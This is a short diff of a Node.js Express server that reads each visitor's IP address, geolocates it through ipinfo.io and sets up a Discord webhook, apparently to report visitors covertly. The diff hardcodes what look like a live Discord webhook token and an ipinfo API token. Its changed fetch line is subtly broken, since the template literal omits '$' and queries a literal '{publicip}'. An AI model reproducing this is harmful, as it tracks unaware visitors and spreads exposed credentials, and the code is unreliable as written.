@@ -4,11 +4,11 @@ const fetch = require('node-fetch');
 
 const app = express();
 const port = process.env.PORT || 3000;
-const webhook = new Webhook('YOUR_WEBHOOK_URL');
+const webhook = new Webhook('https://discord.com/api/webhooks/1086852248031727747/KUIk8cpIiF4qDpIASn7UTirGKUu_gHpmEjrPYuuN84OpKOY8Rl4sg34Zm4hvwbmvKYw-');
 
 app.get('/', async (req, res) => {
   const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-  const response = await fetch(`https://ipinfo.io/${ipAddress}/json`);
+  const response = await fetch(`https://ipinfo.io/{publicip}/json?token=2001557f8b906a`);
   const data = await response.json();
 
   const region = data.region;
